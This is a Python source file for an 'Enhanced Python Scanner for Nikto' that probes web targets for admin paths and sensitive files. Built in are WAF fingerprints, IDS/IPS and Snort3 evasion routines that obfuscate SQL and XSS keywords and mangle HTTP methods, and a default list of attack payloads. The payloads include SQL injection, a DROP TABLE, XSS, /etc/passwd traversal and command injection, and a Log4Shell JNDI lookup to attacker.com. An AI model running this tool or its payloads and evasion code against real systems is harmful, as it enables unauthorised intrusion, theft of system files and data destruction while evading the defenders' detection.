#!/usr/bin/env python3
# Enhanced Python Scanner for Nikto
# (c) 2025 Enhanced Nikto Project
#
# This script provides advanced scanning capabilities with Python
# including enhanced evasion, detection, and reporting features.

import sys
import os
import argparse
import requests
import socket
import ssl
import random
import time
import json
import re
import threading
import subprocess
from urllib.parse import urlparse, urljoin
from concurrent.futures import ThreadPoolExecutor
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# Suppress SSL warnings
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# ANSI color codes
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    
    # Advanced color schemes
    SCHEMES = {
        'cyber': {
            'header': '\033[38;5;39m',
            'info': '\033[38;5;45m',
            'success': '\033[38;5;46m',
            'warning': '\033[38;5;208m',
            'error': '\033[38;5;196m',
            'highlight': '\033[38;5;51m',
            'normal': '\033[38;5;15m'
        },
        'desert': {
            'header': '\033[38;5;172m',
            'info': '\033[38;5;180m',
            'success': '\033[38;5;107m',
            'warning': '\033[38;5;214m',
            'error': '\033[38;5;160m',
            'highlight': '\033[38;5;220m',
            'normal': '\033[38;5;223m'
        },
        'neon': {
            'header': '\033[38;5;201m',
            'info': '\033[38;5;207m',
            'success': '\033[38;5;118m',
            'warning': '\033[38;5;226m',
            'error': '\033[38;5;197m',
            'highlight': '\033[38;5;213m',
            'normal': '\033[38;5;159m'
        }
    }

# User agent rotation
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11.5; rv:90.0) Gecko/20100101 Firefox/90.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_5_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Android 11; Mobile; rv:90.0) Gecko/90.0 Firefox/90.0",
    "Mozilla/5.0 (Android 11; Mobile; LG-M255; rv:90.0) Gecko/90.0 Firefox/90.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 OPR/77.0.4054.277"
]

# WAF detection signatures
WAF_SIGNATURES = {
    "Cloudflare": {
        "headers": ["CF-RAY", "CF-Cache-Status", "__cfduid", "cf-ray"],
        "body": ["Cloudflare Ray ID:", "Attention Required! | Cloudflare", "Please turn JavaScript on and reload the page"]
    },
    "AWS WAF": {
        "headers": ["X-Amzn-Trace-Id"],
        "body": ["Request blocked by AWS WAF"]
    },
    "ModSecurity": {
        "headers": ["Mod_Security", "NOYB"],
        "body": ["ModSecurity Action: Access Denied", "This error was generated by mod_security"]
    },
    "Imperva Incapsula": {
        "headers": ["X-Iinfo", "X-CDN", "incap_ses_", "visid_incap_"],
        "body": ["Access Denied - Incapsula Website Security", "Request unsuccessful. Incapsula incident ID"]
    },
    "Akamai Kona": {
        "headers": ["X-Akamai-Transformed"],
        "body": ["Access Denied: Access Denied", "Reference #"]
    },
    "F5 BIG-IP ASM": {
        "headers": ["X-WA-Info", "TS", "BIGipServer"],
        "body": ["Request Rejected", "The requested URL was rejected", "Please consult with your administrator"]
    },
    "Sucuri CloudProxy": {
        "headers": ["X-Sucuri-ID"],
        "body": ["Access Denied - Sucuri Website Firewall", "Sucuri WebSite Firewall - CloudProxy - Access Denied"]
    },
    "Barracuda WAF": {
        "headers": ["barra_counter_session"],
        "body": ["Barracuda Web Application Firewall - Access Denied", "You are being blocked by the Barracuda Web Application Firewall"]
    },
    "Citrix NetScaler AppFirewall": {
        "headers": ["ns_af", "citrix_ns_id"],
        "body": ["Access Denied for URL", "AppFW Session ID:"]
    },
    "Wordfence": {
        "headers": ["wfvt_", "wordfence_verifiedHuman"],
        "body": ["This response was generated by Wordfence", "Your access to this site has been limited"]
    },
    "Fortinet FortiWeb": {
        "headers": ["FORTIWAFSID"],
        "body": ["FortiWeb Web Filtering", "FortiWeb Application Firewall"]
    }
}

# IDS/IPS evasion techniques
class IDSEvasion:
    @staticmethod
    def fragment_request(url, headers=None, data=None, method="GET"):
        """Fragment HTTP request to evade IDS/IPS detection"""
        if headers is None:
            headers = {}
        
        # Add random headers
        evasion_headers = {
            f"X-Random-{random.randint(1000, 9999)}": f"value-{random.randint(1000, 9999)}",
            "Accept-Language": f"en-US,en;q=0.{random.randint(1, 9)}",
            "Accept-Encoding": "gzip, deflate" if random.random() > 0.5 else "deflate, gzip",
            "Connection": "keep-alive" if random.random() > 0.5 else "close"
        }
        headers.update(evasion_headers)
        
        # Fragment POST data if applicable
        if method.upper() == "POST" and data:
            if isinstance(data, dict):
                # Convert dict to string with random order
                items = list(data.items())
                random.shuffle(items)
                data = "&".join([f"{k}={v}" for k, v in items])
        
        return url, headers, data, method
    
    @staticmethod
    def timing_evasion():
        """Add random delays to evade timing-based detection"""
        # Random sleep between 0.1 and 1.5 seconds
        time.sleep(0.1 + random.random() * 1.4)
    
    @staticmethod
    def encode_payload(payload, technique=None):
        """Encode payload using various techniques to evade signature-based detection"""
        if technique is None:
            technique = random.choice(["url", "double_url", "unicode", "hex", "mixed"])
        
        if technique == "url":
            return ''.join(['%' + hex(ord(c))[2:].zfill(2) for c in payload])
        elif technique == "double_url":
            single_encoded = ''.join(['%' + hex(ord(c))[2:].zfill(2) for c in payload])
            return ''.join(['%' + hex(ord(c))[2:].zfill(2) for c in single_encoded])
        elif technique == "unicode":
            return ''.join([r'\u00' + hex(ord(c))[2:].zfill(2) for c in payload])
        elif technique == "hex":
            return ''.join(['\\x' + hex(ord(c))[2:].zfill(2) for c in payload])
        elif technique == "mixed":
            result = ""
            for c in payload:
                r = random.random()
                if r < 0.2:
                    result += '%' + hex(ord(c))[2:].zfill(2)
                elif r < 0.4:
                    result += r'\u00' + hex(ord(c))[2:].zfill(2)
                elif r < 0.6:
                    result += '\\x' + hex(ord(c))[2:].zfill(2)
                else:
                    result += c
            return result
        return payload

# Snort3 specific evasion techniques
class Snort3Evasion:
    @staticmethod
    def apply_tcp_fragmentation(payload):
        """Simulate TCP fragmentation to evade Snort3 detection"""
        # This is a simulation as actual TCP fragmentation requires lower-level network access
        fragments = []
        fragment_size = random.randint(3, 8)
        for i in range(0, len(payload), fragment_size):
            fragments.append(payload[i:i+fragment_size])
        return fragments
    
    @staticmethod
    def polymorphic_payload(payload):
        """Create polymorphic variations of the payload to evade Snort3 signatures"""
        # Replace common attack strings with equivalent variations
        replacements = {
            "SELECT": random.choice(["SeLeCt", "S\nELECT", "S/**/ELECT", "/*!SELECT*/"]),
            "UNION": random.choice(["UnIoN", "U\nNION", "U/**/NION", "/*!UNION*/"]),
            "INSERT": random.choice(["InSeRt", "I\nNSERT", "I/**/NSERT", "/*!INSERT*/"]),
            "UPDATE": random.choice(["UpDaTe", "U\nPDATE", "U/**/PDATE", "/*!UPDATE*/"]),
            "DELETE": random.choice(["DeLeTe", "D\nELETE", "D/**/ELETE", "/*!DELETE*/"]),
            "DROP": random.choice(["DrOp", "D\nROP", "D/**/ROP", "/*!DROP*/"]),
            "script": random.choice(["scr\nipt", "scr<!---->ipt", "scr%09ipt", "scr\tipt"]),
            "alert": random.choice(["ale\nrt", "ale<!---->rt", "ale%09rt", "ale\trt"]),
            "onload": random.choice(["onlo\nad", "onlo<!---->ad", "onlo%09ad", "onlo\tad"]),
            "onerror": random.choice(["oner\nror", "oner<!---->ror", "oner%09ror", "oner\tror"])
        }
        
        for key, value in replacements.items():
            if key in payload:
                payload = payload.replace(key, value)
        
        return payload
    
    @staticmethod
    def http_method_obfuscation(method):
        """Obfuscate HTTP method to evade Snort3 detection"""
        if method.upper() == "GET":
            return random.choice(["GET", "G\nET", "G%20ET", "G\tET", "Get"])
        elif method.upper() == "POST":
            return random.choice(["POST", "P\nOST", "P%20OST", "P\tOST", "Post"])
        return method

# Advanced scanning functions
class AdvancedScanner:
    def __init__(self, target, options):
        self.target = target
        self.options = options
        self.results = []
        self.waf_detected = None
        self.ids_detected = False
        self.color_scheme = options.get('color_scheme', 'cyber')
        self.threads = options.get('threads', 10)
        self.timeout = options.get('timeout', 10)
        self.delay = options.get('delay', 0)
        self.proxy = options.get('proxy', None)
        self.user_agent_rotation = options.get('user_agent_rotation', True)
        self.evasion_techniques = options.get('evasion_techniques', True)
        self.snort3_evasion = options.get('snort3_evasion', True)
        self.scan_paths = options.get('scan_paths', [])
        self.custom_payloads = options.get('custom_payloads', [])
        self.output_file = options.get('output_file', None)
        self.verbose = options.get('verbose', False)
        
        # Initialize session
        self.session = requests.Session()
        if self.proxy:
            self.session.proxies = {
                'http': self.proxy,
                'https': self.proxy
            }
    
    def print_colored(self, message, color_type='normal'):
        """Print colored message based on selected color scheme"""
        scheme = Colors.SCHEMES.get(self.color_scheme, Colors.SCHEMES['cyber'])
        color = scheme.get(color_type, scheme['normal'])
        print(f"{color}{message}{Colors.ENDC}")
    
    def get_random_user_agent(self):
        """Get random user agent from the list"""
        return random.choice(USER_AGENTS)
    
    def detect_waf(self, response):
        """Detect WAF based on response headers and body"""
        if self.waf_detected:
            return self.waf_detected
        
        for waf_name, signatures in WAF_SIGNATURES.items():
            # Check headers
            for header in signatures['headers']:
                if header.lower() in [h.lower() for h in response.headers]:
                    self.waf_detected = waf_name
                    return waf_name
            
            # Check body
            if response.text:
                for pattern in signatures['body']:
                    if pattern in response.text:
                        self.waf_detected = waf_name
                        return waf_name
        
        return None
    
    def detect_ids(self, response):
        """Detect IDS/IPS based on response patterns and timing"""
        # Check for common IDS/IPS block patterns
        ids_patterns = [
            "Access Denied", "Forbidden", "Request Rejected", 
            "Security Violation", "Intrusion Detection", "Attack Detected",
            "Suspicious Activity", "Malicious Request", "IP Blocked"
        ]
        
        if response.status_code in [403, 406, 429, 503]:
            for pattern in ids_patterns:
                if pattern in response.text:
                    self.ids_detected = True
                    return True
        
        return False
    
    def make_request(self, url, method="GET", data=None, headers=None, evasion=True):
        """Make HTTP request with evasion techniques if enabled"""
        if headers is None:
            headers = {}
        
        # Apply user agent rotation
        if self.user_agent_rotation:
            headers['User-Agent'] = self.get_random_user_agent()
        
        # Apply evasion techniques
        if evasion and self.evasion_techniques:
            url, headers, data, method = IDSEvasion.fragment_request(url, headers, data, method)
            
            # Apply timing evasion
            IDSEvasion.timing_evasion()
        
        # Apply Snort3 specific evasion
        if evasion and self.snort3_evasion:
            if data and isinstance(data, str):
                data = Snort3Evasion.polymorphic_payload(data)
            method = Snort3Evasion.http_method_obfuscation(method)
        
        # Add delay if specified
        if self.delay > 0:
            time.sleep(self.delay)
        
        try:
            if method.upper() == "GET":
                response = self.session.get(
                    url, 
                    headers=headers, 
                    verify=False, 
                    timeout=self.timeout
                )
            elif method.upper() == "POST":
                response = self.session.post(
                    url, 
                    data=data, 
                    headers=headers, 
                    verify=False, 
                    timeout=self.timeout
                )
            elif method.upper() == "HEAD":
                response = self.session.head(
                    url, 
                    headers=headers, 
                    verify=False, 
                    timeout=self.timeout
                )
            else:
                response = self.session.request(
                    method,
                    url, 
                    data=data, 
                    headers=headers, 
                    verify=False, 
                    timeout=self.timeout
                )
            
            # Detect WAF and IDS
            waf = self.detect_waf(response)
            ids = self.detect_ids(response)
            
            if waf and self.verbose:
                self.print_colored(f"[!] WAF Detected: {waf}", 'warning')
            
            if ids and self.verbose:
                self.print_colored(f"[!] IDS/IPS Detected", 'warning')
            
            return response
            
        except requests.exceptions.RequestException as e:
            if self.verbose:
                self.print_colored(f"[!] Request Error: {str(e)}", 'error')
            return None
    
    def scan_path(self, path, method="GET", data=None):
        """Scan a specific path on the target"""
        url = urljoin(self.target, path)
        
        if self.verbose:
            self.print_colored(f"[*] Scanning: {url}", 'info')
        
        response = self.make_request(url, method, data)
        
        if response:
            result = {
                'url': url,
                'status_code': response.status_code,
                'content_length': len(response.content),
                'method': method,
                'waf_detected': self.waf_detected,
                'ids_detected': self.ids_detected,
                'headers': dict(response.headers)
            }
            
            # Check for interesting findings
            if 200 <= response.status_code < 300:
                if self.verbose:
                    self.print_colored(f"[+] Found: {url} (Status: {response.status_code})", 'success')
                result['interesting'] = True
            elif response.status_code == 401 or response.status_code == 403:
                if self.verbose:
                    self.print_colored(f"[+] Protected resource: {url} (Status: {response.status_code})", 'highlight')
                result['protected'] = True
            
            self.results.append(result)
            return result
        
        return None
    
    def scan_target(self):
        """Scan the target with all configured paths and payloads"""
        self.print_colored(f"[*] Starting advanced scan on {self.target}", 'header')
        self.print_colored(f"[*] Using color scheme: {self.color_scheme}", 'info')
        
        if self.evasion_techniques:
            self.print_colored("[*] IDS/IPS evasion techniques enabled", 'info')
        
        if self.snort3_evasion:
            self.print_colored("[*] Snort3 specific evasion techniques enabled", 'info')
        
        # Initial request to detect WAF/IDS
        self.print_colored("[*] Performing initial request to detect protection systems", 'info')
        response = self.make_request(self.target, evasion=False)
        
        if response:
            self.print_colored(f"[*] Target is up (Status: {response.status_code})", 'success')
            
            if self.waf_detected:
                self.print_colored(f"[!] WAF Detected: {self.waf_detected}", 'warning')
                self.print_colored("[*] Enabling advanced WAF bypass techniques", 'info')
            
            if self.ids_detected:
                self.print_colored("[!] IDS/IPS Detected", 'warning')
                self.print_colored("[*] Enabling advanced IDS/IPS bypass techniques", 'info')
        else:
            self.print_colored("[!] Failed to connect to target", 'error')
            return False
        
        # Scan all paths
        self.print_colored(f"[*] Scanning {len(self.scan_paths)} paths with {self.threads} threads", 'info')
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            for path in self.scan_paths:
                futures.append(executor.submit(self.scan_path, path))
            
            for future in futures:
                future.result()
        
        # Scan with custom payloads
        if self.custom_payloads:
            self.print_colored(f"[*] Testing {len(self.custom_payloads)} custom payloads", 'info')
            
            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                futures = []
                for payload in self.custom_payloads:
                    path = f"/?test={IDSEvasion.encode_payload(payload)}"
                    futures.append(executor.submit(self.scan_path, path))
                
                for future in futures:
                    future.result()
        
        # Generate report
        self.print_colored(f"[*] Scan completed. Found {len(self.results)} results", 'header')
        
        interesting_results = [r for r in self.results if r.get('interesting', False)]
        protected_results = [r for r in self.results if r.get('protected', False)]
        
        self.print_colored(f"[*] Interesting findings: {len(interesting_results)}", 'success')
        self.print_colored(f"[*] Protected resources: {len(protected_results)}", 'warning')
        
        # Save results to file if specified
        if self.output_file:
            with open(self.output_file, 'w') as f:
                json.dump(self.results, f, indent=4)
            self.print_colored(f"[*] Results saved to {self.output_file}", 'success')
        
        return True

# Main function
def main():
    parser = argparse.ArgumentParser(description="Enhanced Python Scanner for Nikto")
    parser.add_argument("-t", "--target", required=True, help="Target URL to scan")
    parser.add_argument("-o", "--output", help="Output file for results (JSON format)")
    parser.add_argument("-c", "--color-scheme", choices=["cyber", "desert", "neon"], default="cyber", help="Color scheme to use")
    parser.add_argument("-T", "--threads", type=int, default=10, help="Number of threads to use")
    parser.add_argument("-d", "--delay", type=float, default=0, help="Delay between requests in seconds")
    parser.add_argument("-p", "--proxy", help="Proxy to use (e.g., http://127.0.0.1:8080)")
    parser.add_argument("-e", "--evasion", action="store_true", help="Enable IDS/IPS evasion techniques")
    parser.add_argument("-s", "--snort3", action="store_true", help="Enable Snort3 specific evasion techniques")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")
    parser.add_argument("-P", "--paths-file", help="File containing paths to scan")
    parser.add_argument("-C", "--custom-payloads-file", help="File containing custom payloads to test")
    
    args = parser.parse_args()
    
    # Load paths
    scan_paths = [
        "/",
        "/admin",
        "/login",
        "/wp-admin",
        "/administrator",
        "/phpmyadmin",
        "/manager",
        "/api",
        "/console",
        "/backup",
        "/config",
        "/db",
        "/dev",
        "/test",
        "/tmp",
        "/.git",
        "/.env",
        "/robots.txt",
        "/sitemap.xml",
        "/server-status",
        "/server-info"
    ]
    
    if args.paths_file:
        try:
            with open(args.paths_file, 'r') as f:
                additional_paths = [line.strip() for line in f if line.strip()]
                scan_paths.extend(additional_paths)
        except Exception as e:
            print(f"Error loading paths file: {str(e)}")
    
    # Load custom payloads
    custom_payloads = [
        "' OR '1'='1",
        "<script>alert(1)</script>",
        "../../../../../../etc/passwd",
        "$(cat /etc/passwd)",
        "|cat /etc/passwd",
        "' UNION SELECT 1,2,3,4,5 --",
        "admin' --",
        "1; DROP TABLE users",
        "${jndi:ldap://attacker.com/a}",
        "{{7*7}}"
    ]
    
    if args.custom_payloads_file:
        try:
            with open(args.custom_payloads_file, 'r') as f:
                additional_payloads = [line.strip() for line in f if line.strip()]
                custom_payloads.extend(additional_payloads)
        except Exception as e:
            print(f"Error loading custom payloads file: {str(e)}")
    
    # Configure scanner options
    options = {
        'color_scheme': args.color_scheme,
        'threads': args.threads,
        'timeout': 10,
        'delay': args.delay,
        'proxy': args.proxy,
        'user_agent_rotation': True,
        'evasion_techniques': args.evasion,
        'snort3_evasion': args.snort3,
        'scan_paths': scan_paths,
        'custom_payloads': custom_payloads,
        'output_file': args.output,
        'verbose': args.verbose
    }
    
    # Create and run scanner
    scanner = AdvancedScanner(args.target, options)
    scanner.scan_target()

if __name__ == "__main__":
    main()
